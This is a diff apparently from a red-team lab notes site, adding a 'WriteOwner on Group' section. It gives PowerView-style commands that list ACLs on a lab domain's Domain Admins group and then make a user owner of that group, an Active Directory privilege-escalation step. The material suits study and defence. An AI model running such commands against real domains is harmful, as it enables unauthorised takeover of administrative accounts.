@@ -122,6 +122,26 @@ Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-14-11-25.png)
 
+### WriteOwner on Group
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-36.png)
+
+```csharp
+Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-42.png)
+
+```csharp
+Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-16-54-59.png)
+
+
+
+
+
 
 
 ## References
